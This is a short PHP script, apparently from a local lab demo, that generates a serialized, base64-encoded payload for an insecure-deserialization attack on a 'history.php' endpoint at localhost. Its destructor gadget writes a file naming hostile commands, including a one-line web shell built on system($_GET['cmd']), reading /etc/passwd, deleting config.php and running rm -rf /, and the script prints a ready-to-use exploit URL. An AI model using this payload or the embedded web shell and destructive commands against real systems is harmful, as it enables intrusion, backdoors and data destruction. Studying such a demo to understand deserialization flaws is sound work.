<?php
class DentalExploit {
    public $message = "Safe message";

    public function __destruct() {
        // When object is destroyed, this writes real attack potential
        file_put_contents(__DIR__ . 
            '/hacked.txt', 
            "💥 Insecure Deserialization Exploited!\n" .
            "🗑 Delete files -> unlink('config.php')\n" .
            "🕵 Exfiltrate data -> file_get_contents('/etc/passwd')\n" .
            "💉 Plant backdoors -> file_put_contents('shell.php', '<?php system(\$_GET[\"cmd\"]); ?>')\n" .
            "🧬 Run system commands -> system('rm -rf /')\n" .
            "👤 Hijack sessions or escalate privileges\n",
            FILE_APPEND
        );
    }
}

// Create malicious object
$exploit = new DentalExploit();
$exploit->message = "This looks harmless but isn't!";

// Generate payload
echo "Use this payload:\n";
echo "http://localhost:8000/history.php?exploit=" . urlencode(base64_encode(serialize($exploit)));
?>
